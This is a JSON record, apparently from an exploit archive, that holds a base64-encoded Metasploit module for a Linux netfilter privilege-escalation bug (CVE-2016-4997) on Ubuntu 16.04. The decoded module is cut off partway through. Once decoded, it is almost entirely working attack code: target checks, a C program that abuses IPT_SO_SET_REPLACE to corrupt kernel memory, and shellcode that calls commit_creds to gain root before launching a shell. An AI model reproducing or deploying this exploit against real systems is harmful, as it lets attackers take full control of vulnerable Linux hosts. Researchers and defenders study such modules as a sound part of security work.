{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICJtc2YvY29yZSINCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6TG9jYWwNCiAgUmFuayA9IEdvb2RSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OkZpbGUNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RmlsZURyb3BwZXINCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICAgJ05hbWUnICAgICAgICAgICA9PiAnTGludXggS2VybmVsIDQuNi4zIE5ldGZpbHRlciBQcml2aWxlZ2UgRXNjYWxhdGlvbicsDQogICAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgICAgVGhpcyBtb2R1bGUgYXR0ZW1wdHMgdG8gZXhwbG9pdCBhIG5ldGZpbHRlciBidWcgb24gTGludXggS2VybmVscyBiZWZvZSA0LjYuMywgYW5kIGN1cnJlbnRseQ0KICAgICAgICAgIG9ubHkgd29ya3MgYWdhaW5zdCBVYnVudHUgMTYuMDQgKG5vdCAxNi4wNC4xKSB3aXRoIGtlcm5lbA0KICAgICAgICAgIDQuNC4wLTIxLWdlbmVyaWMuDQogICAgICAgICAgU2V2ZXJhbCBjb25kaXRpb25zIGhhdmUgdG8gYmUgbWV0IGZvciBzdWNjZXNzZnVsIGV4cGxvaXRhdGlvbjoNCiAgICAgICAgICBVYnVudHU6DQogICAgICAgICAgMS4gaXBfdGFibGVzLmtvICh1YnVudHUpLCBpcHRhYmxlX3JhdyAoZmVkb3JhKSBoYXMgdG8gYmUgbG9hZGVkIChyb290IHJ1bm5pbmcgaXB0YWJsZXMgLUwgd2lsbCBkbyBzdWNoKQ0KICAgICAgICAgIDIuIGxpYmM2LWRldi1pMzg2ICh1YnVudHUpLCBnbGliYy1kZXZlbC5pNjg2ICAmIGxpYmdjYy5pNjg2IChmZWRvcmEpIG5lZWRzIHRvIGJlIGluc3RhbGxlZCB0byBjb21waWxlDQogICAgICAgICAgS2VybmVsIDQuNC4wLTMxLWdlbmVyaWMgYW5kIG5ld2VyIGFyZSBub3QgdnVsbmVyYWJsZS4NCg0KICAgICAgICAgIFdlIHdyaXRlIHRoZSBhc2NpaSBmaWxlcyBhbmQgY29tcGlsZSBvbiB0YXJnZXQgaW5zdGVhZCBvZiBsb2NhbGx5IHNpbmNlIG1ldGFzbSBib21icyBmb3Igbm90DQogICAgICAgICAgaGF2aW5nIGNkZWZzLmggKGV2ZW4gaWYgbG9jYWxseSBpbnN0YWxsZWQpDQogICAgICAgIH0sDQogICAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAgICdBdXRob3InICAgICAgICAgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICAnaDAwZGllIDxtaWtlQHN0Y3lyc2VjdXJpdHkuY29tPicsICAjIE1vZHVsZQ0KICAgICAgICAgICAgJ3ZuaWsnICAgICAgICAgICAgICAgICAgICAgICAgICMgRGlzY292ZXJ5DQogICAgICAgICAgXSwNCiAgICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAnSnVuIDAzIDIwMTYnLA0KICAgICAgICAnUGxhdGZvcm0nICAgICAgID0+IFsgJ2xpbnV4J10sDQogICAgICAgICdBcmNoJyAgICAgICAgICAgPT4gWyBBUkNIX1g4NiBdLA0KICAgICAgICAnU2Vzc2lvblR5cGVzJyAgID0+IFsgJ3NoZWxsJywgJ21ldGVycHJldGVyJyBdLA0KICAgICAgICAnVGFyZ2V0cycgICAgICAgID0+DQogICAgICAgICAgWw0KICAgICAgICAgICAgWyAnVWJ1bnR1JywgeyB9IF0NCiAgICAgICAgICAgICNbICdGZWRvcmEnLCB7IH0gXQ0KICAgICAgICAgIF0sDQogICAgICAgICdEZWZhdWx0VGFyZ2V0JyAgPT4gMCwNCiAgICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICAgIFsNCiAgICAgICAgICAgIFsgJ0VEQicsICc0MDA0OSddLA0KICAgICAgICAgICAgWyAnQ1ZFJywgJzIwMTYtNDk5NyddLA0KICAgICAgICAgICAgWyAnVVJMJywgJ2h0dHA6Ly9naXQua2VybmVsLm9yZy9jZ2l0L2xpbnV4L2tlcm5lbC9naXQvdG9ydmFsZHMvbGludXguZ2l0L2NvbW1pdC8/aWQ9Y2U2ODNlNWY5ZDA0NWU1ZDY3ZDEzMTJhNDJiMzU5Y2IyYWIyYTEzYyddDQogICAgICAgICAgXQ0KICAgICAgKSkNCiAgICByZWdpc3Rlcl9vcHRpb25zKA0KICAgICAgWw0KICAgICAgICBPcHRTdHJpbmcubmV3KCdXcml0YWJsZURpcicsIFsgdHJ1ZSwgJ0EgZGlyZWN0b3J5IHdoZXJlIHdlIGNhbiB3cml0ZSBmaWxlcyAobXVzdCBub3QgYmUgbW91bnRlZCBub2V4ZWMpJywgJy90bXAnIF0pLA0KICAgICAgICBPcHRJbnQubmV3KCdNQVhXQUlUJywgWyB0cnVlLCAnTWF4IHNlY29uZHMgdG8gd2FpdCBmb3IgZGVjcmVtZW50YXRpb24gaW4gc2Vjb25kcycsIDE4MCBdKSwNCiAgICAgICAgT3B0Qm9vbC5uZXcoJ1JFRVhQTE9JVCcsIFsgdHJ1ZSwgJ2Rlc2MgYWxyZWFkeSByYW4sIG5vIG5lZWQgdG8gcmUtcnVuLCBza2lwIHRvIHJ1bm5pbmcgcHduJyxmYWxzZV0pLA0KICAgICAgICBPcHRFbnVtLm5ldygnQ09NUElMRScsIFsgdHJ1ZSwgJ0NvbXBpbGUgb24gdGFyZ2V0JywgJ0F1dG8nLCBbJ0F1dG8nLCAnVHJ1ZScsICdGYWxzZSddXSkNCiAgICAgIF0sIHNlbGYuY2xhc3MpDQogIGVuZA0KDQogIGRlZiBjaGVjaw0KICAgIGRlZiBpcHRhYmxlc19sb2FkZWQ/KCkNCiAgICAgICMgdXNlckB1YnVudHU6fiQgY2F0IC9wcm9jL21vZHVsZXMgfCBncmVwIGlwX3RhYmxlcw0KICAgICAgIyBpcF90YWJsZXMgMjg2NzIgMSBpcHRhYmxlX2ZpbHRlciwgTGl2ZSAweDAwMDAwMDAwMDAwMDAwMDANCiAgICAgICMgeF90YWJsZXMgMzY4NjQgMiBpcHRhYmxlX2ZpbHRlcixpcF90YWJsZXMsIExpdmUgMHgwMDAwMDAwMDAwMDAwMDAwDQogICAgICB2cHJpbnRfc3RhdHVzKCdDaGVja2luZyBpZiBpcF90YWJsZXMgaXMgbG9hZGVkIGluIGtlcm5lbCcpDQogICAgICBpZiB0YXJnZXQubmFtZSA9PSAiVWJ1bnR1Ig0KICAgICAgICBpcHRhYmxlcyA9IGNtZF9leGVjKCdjYXQgL3Byb2MvbW9kdWxlcyB8IGdyZXAgaXBfdGFibGVzJykNCiAgICAgICAgaWYgaXB0YWJsZXMuaW5jbHVkZT8oJ2lwX3RhYmxlcycpDQogICAgICAgICAgdnByaW50X2dvb2QoJ2lwX3RhYmxlcy5rbyBpcyBsb2FkZWQnKQ0KICAgICAgICBlbHNlDQogICAgICAgICAgcHJpbnRfZXJyb3IoJ2lwX3RhYmxlcy5rbyBpcyBub3QgbG9hZGVkLiAgcm9vdCBuZWVkcyB0byBydW4gaXB0YWJsZXMgLUwgb3Igc2ltaWxhciBjb21tYW5kJykNCiAgICAgICAgZW5kDQogICAgICAgIHJldHVybiBpcHRhYmxlcy5pbmNsdWRlPygnaXBfdGFibGVzJykNCiAgICAgIGVsc2lmIHRhcmdldC5uYW1lID09ICJGZWRvcmEiDQogICAgICAgIGlwdGFibGVzID0gY21kX2V4ZWMoJ2NhdCAvcHJvYy9tb2R1bGVzIHwgZ3JlcCBpcHRhYmxlX3JhdycpDQogICAgICAgIGlmIGlwdGFibGVzLmluY2x1ZGU/KCdpcHRhYmxlX3JhdycpDQogICAgICAgICAgdnByaW50X2dvb2QoJ2lwdGFibGVfcmF3IGlzIGxvYWRlZCcpDQogICAgICAgIGVsc2UNCiAgICAgICAgICBwcmludF9lcnJvcignaXB0YWJsZV9yYXcgaXMgbm90IGxvYWRlZC4gIHJvb3QgbmVlZHMgdG8gcnVuIGlwdGFibGVzIC1MIG9yIHNpbWlsYXIgY29tbWFuZCcpDQogICAgICAgIGVuZA0KICAgICAgICByZXR1cm4gaXB0YWJsZXMuaW5jbHVkZT8oJ2lwdGFibGVfcmF3JykNCiAgICAgIGVsc2UNCiAgICAgICAgcmV0dXJuIGZhbHNlDQogICAgICBlbmQNCiAgICBlbmQNCg0KICAgIGRlZiBzaGVtc2hhbV9pbnN0YWxsZWQ/KCkNCiAgICAgICMgd2Ugd2FudCB0aGlzIHRvIGJlIGZhbHNlLg0KICAgICAgdnByaW50X3N0YXR1cygnQ2hlY2tpbmcgaWYgc2hlbSBvciBzaGFtIGFyZSBpbnN0YWxsZWQnKQ0KICAgICAgc2hlbXNoYW0gPSBjbWRfZXhlYygnY2F0IC9wcm9jL2NwdWluZm8nKQ0KICAgICAgaWYgc2hlbXNoYW0uaW5jbHVkZT8oJ3NoZW0nKQ0KICAgICAgICBwcmludF9lcnJvcignc2hlbSBpbnN0YWxsZWQsIHN5c3RlbSBub3QgdnVsbmVyYWJsZS4nKQ0KICAgICAgZWxzaWYgc2hlbXNoYW0uaW5jbHVkZT8oJ3NoYW0nKQ0KICAgICAgICBwcmludF9lcnJvcignc2hhbSBpbnN0YWxsZWQsIHN5c3RlbSBub3QgdnVsbmVyYWJsZS4nKQ0KICAgICAgZWxzZQ0KICAgICAgICB2cHJpbnRfZ29vZCgnc2hlbSBhbmQgc2hhbSBub3QgcHJlc2VudC4nKQ0KICAgICAgZW5kDQogICAgICByZXR1cm4gKHNoZW1zaGFtLmluY2x1ZGU/KCdzaGVtJykgb3Igc2hlbXNoYW0uaW5jbHVkZT8oJ3NoYW0nKSkNCiAgICBlbmQNCg0KICAgIGlmIGlwdGFibGVzX2xvYWRlZD8oKSBhbmQgbm90IHNoZW1zaGFtX2luc3RhbGxlZD8oKQ0KICAgICAgcmV0dXJuIENoZWNrQ29kZTo6QXBwZWFycw0KICAgIGVsc2UNCiAgICAgIHJldHVybiBDaGVja0NvZGU6OlNhZmUNCiAgICBlbmQNCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICAjIGZpcnN0IHRoaW5nIHdlIG5lZWQgdG8gZG8gaXMgZGV0ZXJtaW5lIG91ciBtZXRob2Qgb2YgZXhwbG9pdGF0aW9uOiBjb21waWxpbmcgcmVhbHRpbWUsIG9yIGRyb3BpbmcgYSBwcmUtY29tcGlsZWQgdmVyc2lvbi4NCiAgICBkZWYgaGFzX3ByZXJlcXM/KCkNCiAgICAgIHZwcmludF9zdGF0dXMoJ0NoZWNraW5nIGlmIDMyYml0IEMgbGlicmFyaWVzLCBnY2MtbXVsdGlsaWIsIGFuZCBnY2MgYXJlIGluc3RhbGxlZCcpDQogICAgICBpZiB0YXJnZXQubmFtZSA9PSAiVWJ1bnR1Ig0KICAgICAgICBsaWIgPSBjbWRfZXhlYygnZHBrZyAtLWdldC1zZWxlY3Rpb25zIHwgZ3JlcCBsaWJjNi1kZXYtaTM4NicpDQogICAgICAgIGlmIGxpYi5pbmNsdWRlPygnaW5zdGFsbCcpDQogICAgICAgICAgdnByaW50X2dvb2QoJ2xpYmM2LWRldi1pMzg2IGlzIGluc3RhbGxlZCcpDQogICAgICAgIGVsc2UNCiAgICAgICAgICBwcmludF9lcnJvcignbGliYzYtZGV2LWkzODYgaXMgbm90IGluc3RhbGxlZC4gIENvbXBpbGluZyB3aWxsIGZhaWwuJykNCiAgICAgICAgZW5kDQogICAgICAgIG11bHRpbGliID0gY21kX2V4ZWMoJ2Rwa2cgLS1nZXQtc2VsZWN0aW9ucyB8IGdyZXAgXmdjYy1tdWx0aWxpYicpDQogICAgICAgIGlmIG11bHRpbGliLmluY2x1ZGU/KCdpbnN0YWxsJykNCiAgICAgICAgICB2cHJpbnRfZ29vZCgnZ2NjLW11bHRpbGliIGlzIGluc3RhbGxlZCcpDQogICAgICAgIGVsc2UNCiAgICAgICAgICBwcmludF9lcnJvcignZ2NjLW11bHRpbGliIGlzIG5vdCBpbnN0YWxsZWQuICBDb21waWxpbmcgd2lsbCBmYWlsLicpDQogICAgICAgIGVuZA0KICAgICAgICBnY2MgPSBjbWRfZXhlYygnd2hpY2ggZ2NjJykNCiAgICAgICAgaWYgZ2NjLmluY2x1ZGU/KCdnY2MnKQ0KICAgICAgICAgIHZwcmludF9nb29kKCdnY2MgaXMgaW5zdGFsbGVkJykNCiAgICAgICAgZWxzZQ0KICAgICAgICAgIHByaW50X2Vycm9yKCdnY2MgaXMgbm90IGluc3RhbGxlZC4gIENvbXBpbGluZyB3aWxsIGZhaWwuJykNCiAgICAgICAgZW5kDQogICAgICAgIHJldHVybiBnY2MuaW5jbHVkZT8oJ2djYycpICYmIGxpYi5pbmNsdWRlPygnaW5zdGFsbCcpICYmIG11bHRpbGliLmluY2x1ZGU/KCdpbnN0YWxsJykNCiAgICAgIGVsc2lmIHRhcmdldC5uYW1lID09ICJGZWRvcmEiDQogICAgICAgIGxpYiA9IGNtZF9leGVjKCdkbmYgbGlzdCBpbnN0YWxsZWQgfCBncmVwIC1FIFwnKGdsaWJjLWRldmVsLmk2ODZ8bGliZ2NjLmk2ODYpXCcnKQ0KICAgICAgICBpZiBsaWIuaW5jbHVkZT8oJ2dsaWJjJykNCiAgICAgICAgICB2cHJpbnRfZ29vZCgnZ2xpYmMtZGV2ZWwuaTY4NiBpcyBpbnN0YWxsZWQnKQ0KICAgICAgICBlbHNlDQogICAgICAgICAgcHJpbnRfZXJyb3IoJ2dsaWJjLWRldmVsLmk2ODYgaXMgbm90IGluc3RhbGxlZC4gIENvbXBpbGluZyB3aWxsIGZhaWwuJykNCiAgICAgICAgZW5kDQogICAgICAgIGlmIGxpYi5pbmNsdWRlPygnbGliZ2NjJykNCiAgICAgICAgICB2cHJpbnRfZ29vZCgnbGliZ2NjLmk2ODYgaXMgaW5zdGFsbGVkJykNCiAgICAgICAgZWxzZQ0KICAgICAgICAgIHByaW50X2Vycm9yKCdsaWJnY2MuaTY4NiBpcyBub3QgaW5zdGFsbGVkLiAgQ29tcGlsaW5nIHdpbGwgZmFpbC4nKQ0KICAgICAgICBlbmQNCiAgICAgICAgbXVsdGlsaWIgPSBmYWxzZSAjbm90IGltcGxlbWVudGVkDQogICAgICAgIGdjYyA9IGZhbHNlICNub3QgaW1wbGVtZW50ZWQNCiAgICAgICAgcmV0dXJuIChsaWIuaW5jbHVkZT8oJ2dsaWJjJykgJiYgbGliLmluY2x1ZGU/KCdsaWJnY2MnKSkgJiYgZ2NjICYmIG11bHRpbGliDQogICAgICBlbHNlDQogICAgICAgIHJldHVybiBmYWxzZQ0KICAgICAgZW5kDQogICAgZW5kDQoNCiAgICBjb21waWxlID0gZmFsc2UNCiAgICBpZiBkYXRhc3RvcmVbJ0NPTVBJTEUnXSA9PSAnQXV0bycgfHwgZGF0YXN0b3JlWydDT01QSUxFJ10gPT0gJ1RydWUnDQogICAgICBpZiBoYXNfcHJlcmVxcz8oKQ0KICAgICAgICBjb21waWxlID0gdHJ1ZQ0KICAgICAgICB2cHJpbnRfc3RhdHVzKCdMaXZlIGNvbXBpbGluZyBleHBsb2l0IG9uIHN5c3RlbScpDQogICAgICBlbHNlDQogICAgICAgIHZwcmludF9zdGF0dXMoJ0Ryb3BwaW5nIHByZS1jb21waWxlZCBleHBsb2l0IG9uIHN5c3RlbScpDQogICAgICBlbmQNCiAgICBlbmQNCiAgICBpZiBjaGVjayAhPSBDaGVja0NvZGU6OkFwcGVhcnMNCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAnVGFyZ2V0IG5vdCB2dWxuZXJhYmxlISBwdW50IScpDQogICAgZW5kDQoNCiAgICBkZXNjX2ZpbGUgPSBkYXRhc3RvcmVbIldyaXRhYmxlRGlyIl0gKyAiLyIgKyByYW5kX3RleHRfYWxwaGFudW1lcmljKDgpDQogICAgZW52X3JlYWR5X2ZpbGUgPSBkYXRhc3RvcmVbIldyaXRhYmxlRGlyIl0gKyAiLyIgKyByYW5kX3RleHRfYWxwaGFudW1lcmljKDgpDQogICAgcHduX2ZpbGUgPSBkYXRhc3RvcmVbIldyaXRhYmxlRGlyIl0gKyAiLyIgKyByYW5kX3RleHRfYWxwaGFudW1lcmljKDgpDQogICAgcGF5bG9hZF9maWxlID0gcmFuZF90ZXh0X2FscGhhKDgpDQogICAgcGF5bG9hZF9wYXRoID0gIiN7ZGF0YXN0b3JlWyJXcml0YWJsZURpciJdfS8je3BheWxvYWRfZmlsZX0iDQoNCiAgICAjIGRpcmVjdCBjb3B5IG9mIGNvZGUgZnJvbSBleHBsb2l0LWRiLCBleGNlcHQgcmVtb3ZlZCB0aGUgY2hlY2sgZm9yIHNoZW0vc2hhbSBhbmQgaXBfdGFibGVzLmtvIHNpbmNlIHdlIGNhbiBkbyB0aGF0IGluIHRoZSBjaGVjayBhcmVhIGhlcmUNCiAgICAjIHJlbW92ZWQgICAgICAgICAjaW5jbHVkZSA8bmV0aW5ldC9pbi5oPiBwZXIgYnVzdGVyYiBjb21tZW50IGluIFBSIDczMjYNCiAgICBkZWNyID0gJXF7DQogICAgICAjZGVmaW5lIF9HTlVfU09VUkNFDQogICAgICAjaW5jbHVkZSA8c3RkaW8uaD4NCiAgICAgICNpbmNsdWRlIDxzdGRsaWIuaD4NCiAgICAgICNpbmNsdWRlIDxzdHJpbmcuaD4NCiAgICAgICNpbmNsdWRlIDx1bmlzdGQuaD4NCiAgICAgICNpbmNsdWRlIDxzY2hlZC5oPg0KICAgICAgI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiAgICAgICNpbmNsdWRlIDxsaW51eC9zY2hlZC5oPg0KICAgICAgI2luY2x1ZGUgPGVycm5vLmg+DQogICAgICAjaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQogICAgICAjaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KICAgICAgI2luY2x1ZGUgPHN5cy9wdHJhY2UuaD4NCiAgICAgICNpbmNsdWRlIDxuZXQvaWYuaD4NCiAgICAgICNpbmNsdWRlIDxsaW51eC9uZXRmaWx0ZXJfaXB2NC9pcF90YWJsZXMuaD4NCiAgICAgICNpbmNsdWRlIDxsaW51eC9uZXRsaW5rLmg+DQogICAgICAjaW5jbHVkZSA8ZmNudGwuaD4NCiAgICAgICNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KDQogICAgICAjZGVmaW5lIE1BTExPQ19TSVpFIDY2KjEwMjQNCg0KICAgICAgaW50IGRlY3Iodm9pZCAqcCkgew0KICAgICAgICAgIGludCBzb2NrLCBvcHRsZW47DQogICAgICAgICAgaW50IHJldDsNCiAgICAgICAgICB2b2lkICpkYXRhOw0KICAgICAgICAgIHN0cnVjdCBpcHRfcmVwbGFjZSAqcmVwbDsNCiAgICAgICAgICBzdHJ1Y3QgaXB0X2VudHJ5ICplbnRyeTsNCiAgICAgICAgICBzdHJ1Y3QgeHRfZW50cnlfbWF0Y2ggKmVtYXRjaDsNCiAgICAgICAgICBzdHJ1Y3QgeHRfc3RhbmRhcmRfdGFyZ2V0ICp0YXJnZXQ7DQogICAgICAgICAgdW5zaWduZWQgaTsNCg0KICAgICAgICAgIHNvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19SQVcsIElQUFJPVE9fUkFXKTsNCg0KICAgICAgICAgIGlmIChzb2NrID09IC0xKSB7DQogICAgICAgICAgICAgICAgICBwZXJyb3IoInNvY2tldCIpOw0KICAgICAgICAgICAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgICAgIH0NCg0KICAgICAgICAgIGRhdGEgPSBtYWxsb2MoTUFMTE9DX1NJWkUpOw0KDQogICAgICAgICAgaWYgKGRhdGEgPT0gTlVMTCkgew0KICAgICAgICAgICAgICBwZXJyb3IoIm1hbGxvYyIpOw0KICAgICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgICAgfQ0KDQogICAgICAgICAgbWVtc2V0KGRhdGEsIDAsIE1BTExPQ19TSVpFKTsNCg0KICAgICAgICAgIHJlcGwgPSAoc3RydWN0IGlwdF9yZXBsYWNlICopIGRhdGE7DQogICAgICAgICAgcmVwbC0+bnVtX2VudHJpZXMgPSAxOw0KICAgICAgICAgIHJlcGwtPm51bV9jb3VudGVycyA9IDE7DQogICAgICAgICAgcmVwbC0+c2l6ZSA9IHNpemVvZigqcmVwbCkgKyBzaXplb2YoKnRhcmdldCkgKyAweGZmZmY7DQogICAgICAgICAgcmVwbC0+dmFsaWRfaG9va3MgPSAwOw0KDQogICAgICAgICAgZW50cnkgPSAoc3RydWN0IGlwdF9lbnRyeSAqKSAoZGF0YSArIHNpemVvZihzdHJ1Y3QgaXB0X3JlcGxhY2UpKTsNCiAgICAgICAgICBlbnRyeS0+dGFyZ2V0X29mZnNldCA9IDc0OyAvLyBvdmVyd3JpdGUgdGFyZ2V0X29mZnNldA0KICAgICAgICAgIGVudHJ5LT5uZXh0X29mZnNldCA9IHNpemVvZigqZW50cnkpICsgc2l6ZW9mKCplbWF0Y2gpICsgc2l6ZW9mKCp0YXJnZXQpOw0KDQogICAgICAgICAgZW1hdGNoID0gKHN0cnVjdCB4dF9lbnRyeV9tYXRjaCAqKSAoZGF0YSArIHNpemVvZihzdHJ1Y3QgaXB0X3JlcGxhY2UpICsgc2l6ZW9mKCplbnRyeSkpOw0KDQogICAgICAgICAgc3RyY3B5KGVtYXRjaC0+dS51c2VyLm5hbWUsICJpY21wIik7DQogICAgICAgICAgdm9pZCAqa21hdGNoID0gKHZvaWQqKW1tYXAoKHZvaWQgKikweDEwMDAwLCAweDEwMDAsIDcsIDB4MzIsIDAsIDApOw0KICAgICAgICAgIHVpbnQ2NF90ICptZSA9ICh1aW50NjRfdCAqKShrbWF0Y2ggKyAweDU4KTsNCiAgICAgICAgICAqbWUgPSAweGZmZmZmZmZmODIxZGUxMGQ7IC8vIG1hZ2ljIG51bWJlciENCg0KICAgICAgICAgIHVpbnQzMl90ICptYXRjaCA9ICh1aW50MzJfdCAqKSgoY2hhciAqKSZlbWF0Y2gtPnUua2VybmVsLm1hdGNoICsgNCk7DQogICAgICAgICAgKm1hdGNoID0gKHVpbnQzMl90KWttYXRjaDsNCg0KICAgICAgICAgIGVtYXRjaC0+dS5tYXRjaF9zaXplID0gKHNob3J0KTB4ZmZmZjsNCg0KICAgICAgICAgIHRhcmdldCA9IChzdHJ1Y3QgeHRfc3RhbmRhcmRfdGFyZ2V0ICopKGRhdGEgKyBzaXplb2Yoc3RydWN0IGlwdF9yZXBsYWNlKSArIDB4ZmZmZiArIDB4OCk7DQogICAgICAgICAgdWludDMyX3QgKnQgPSAodWludDMyX3QgKil0YXJnZXQ7DQogICAgICAgICAgKnQgPSAodWludDMyX3Qpa21hdGNoOw0KDQogICAgICAgICAgcHJpbnRmKCJbIV0gRGVjcmVtZW50aW5nIHRoZSByZWZjb3VudC4gVGhpcyBtYXkgdGFrZSBhIHdoaWxlLi4uXG4iKTsNCiAgICAgICAgICBwcmludGYoIlshXSBXYWl0IGZvciB0aGUgXCJEb25lXCIgbWVzc2FnZSAoZXZlbiBpZiB5b3UnbGwgZ2V0IHRoZSBwcm9tcHQgYmFjaykuXG4iKTsNCg0KICAgICAgICAgIGZvciAoaSA9IDA7IGkgPCAweGZmZmZmZi8yKzE7IGkrKykgew0KICAgICAgICAgICAgICByZXQgPSBzZXRzb2Nrb3B0KHNvY2ssIFNPTF9JUCwgSVBUX1NPX1NFVF9SRVBMQUNFLCAodm9pZCAqKSBkYXRhLCA2NioxMDI0KTsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICBjbG9zZShzb2NrKTsNCiAgICAgICAgICBmcmVlKGRhdGEpOw0KICAgICAgICAgIHByaW50ZigiWytdIERvbmUhIE5vdyBydW4gLi9wd25cbiIpOw0KDQogICAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQoNCiAgICAgIGludCBtYWluKHZvaWQpIHsNCiAgICAgICAgICB2b2lkICpzdGFjazsNCiAgICAgICAgICBpbnQgcmV0Ow0KDQogICAgICAgICAgcHJpbnRmKCJuZXRmaWx0ZXIgdGFyZ2V0X29mZnNldCBVYnVudHUgMTYuMDQgNC40LjAtMjEtZ2VuZXJpYyBleHBsb2l0IGJ5IHZuaWtcbiIpOw0KDQogICAgICAgICAgcmV0ID0gdW5zaGFyZShDTE9ORV9ORVdVU0VSKTsNCg0KICAgICAgICAgIGlmIChyZXQgPT0gLTEpIHsNCiAgICAgICAgICAgICAgcGVycm9yKCJ1bnNoYXJlIik7DQogICAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgICB9DQoNCiAgICAgICAgICBzdGFjayA9ICh2b2lkICopIG1hbGxvYyg2NTUzNik7DQoNCiAgICAgICAgICBpZiAoc3RhY2sgPT0gTlVMTCkgew0KICAgICAgICAgICAgICBwZXJyb3IoIm1hbGxvYyIpOw0KICAgICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgICAgfQ0KDQogICAgICAgICAgY2xvbmUoZGVjciwgc3RhY2sgKyA2NTUzNiwgQ0xPTkVfTkVXTkVULCBOVUxMKTsNCg0KICAgICAgICAgIHNsZWVwKDEpOw0KDQogICAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KDQogICAgIyBkaXJlY3QgY29weSBvZiBjb2RlIGZyb20gZXhwbG9pdC1kYg0KICAgIHB3biA9ICVxew0KICAgICAgI2luY2x1ZGUgPHN0ZGlvLmg+DQogICAgICAjaW5jbHVkZSA8c3RyaW5nLmg+DQogICAgICAjaW5jbHVkZSA8ZXJybm8uaD4NCiAgICAgICNpbmNsdWRlIDx1bmlzdGQuaD4NCiAgICAgICNpbmNsdWRlIDxzdGRpbnQuaD4NCiAgICAgICNpbmNsdWRlIDxmY250bC5oPg0KICAgICAgI2luY2x1ZGUgPHN5cy9tbWFuLmg+DQogICAgICAjaW5jbHVkZSA8YXNzZXJ0Lmg+DQoNCiAgICAgICNkZWZpbmUgTU1BUF9BRERSIDB4ZmY4MTRlMzAwMA0KICAgICAgI2RlZmluZSBNTUFQX09GRlNFVCAweGIwDQoNCiAgICAgIHR5cGVkZWYgaW50IF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSAoKmNvbW1pdF9jcmVkc19mbikodWludDY0X3QgY3JlZCk7DQogICAgICB0eXBlZGVmIHVpbnQ2NF90IF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSAoKnByZXBhcmVfa2VybmVsX2NyZWRfZm4pKHVpbnQ2NF90IGNyZWQpOw0KDQogICAgICB2b2lkIF9fYXR0cmlidXRlX18oKHJlZ3Bhcm0oMykpKSBwcml2ZXNjKCkgew0KICAgICAgICAgIGNvbW1pdF9jcmVkc19mbiBjb21taXRfY3JlZHMgPSAodm9pZCAqKTB4ZmZmZmZmZmY4MTBhMjFjMDsNCiAgICAgICAgICBwcmVwYXJlX2tlcm5lbF9jcmVkX2ZuIHByZXBhcmVfa2VybmVsX2NyZWQgPSAodm9pZCAqKTB4ZmZmZmZmZmY4MTBhMjViMDsNCiAgICAgICAgICBjb21taXRfY3JlZHMocHJlcGFyZV9rZXJuZWxfY3JlZCgodWludDY0X3QpTlVMTCkpOw0KICAgICAgfQ0KDQogICAgICBpbnQgbWFpbigpIHsNCiAgICAgICAgICB2b2lkICpwYXlsb2FkID0gKHZvaWQqKW1tYXAoKHZvaWQgKilNTUFQX0FERFIsIDB4NDAwMDAwLCA3LCAweDMyLCAwLCAwKTsNCiAgICAgICAgICBhc3NlcnQocGF5bG9hZCA9PSAodm9pZCAqKU1NQVBfQUREUik7DQoNCiAgICAgICAgICB2b2lkICpzaGVsbGNvZGUgPSAodm9pZCAqKShNTUFQX0FERFIgKyBNTUFQX09GRlNFVCk7DQoNCiAgICAgICAgICBtZW1zZXQoc2hlbGxjb2RlLCAwLCAweDMwMDAwMCk7DQoNCiAgICAgICAgICB2b2lkICpyZXQgPSBtZW1jcHkoc2hlbGxjb2RlLCAmcHJpdmVzYywgMHgzMDApOw0KICAgICAgICAgIGFzc2VydChyZXQgPT0gc2hlbGxjb2RlKTsNCg0KICAgICAgICAgIHByaW50ZigiWytdIEVzY2FsYXRpbmcgcHJpdnMuLi5cbiIpOw0KDQogICAgICAgICAgaW50IGZkID0gb3BlbigiL2Rldi9wdG14IiwgT19SRFdSKTsNCiAgICAgICAgICBjbG9zZShmZCk7DQoNCiAgICAgICAgICBhc3NlcnQoIWdldHVpZCgpKTsNCg0KICAgICAgICAgIHByaW50ZigiWytdIFdlJ3ZlIGdvdCByb290ISIpOw0KDQogICAgICAgICAgcmV0dXJuIGV4ZWNsKCIvYmluL2Jhc2giLCAiLXNoIiwgTlVMTCk7DQogICAgICB9DQogICAgfQ0KDQogICAgIyB0aGUgb3JpZ2luYWwgY29kZSBwcmludGVkIGEgbGluZS4gIEhvd2V2ZXIsIHRoaXMgaXMgaGFyZCB0byBkZXRlY3QgZHVlIHRvIHRocmVhZGluZy4NCiA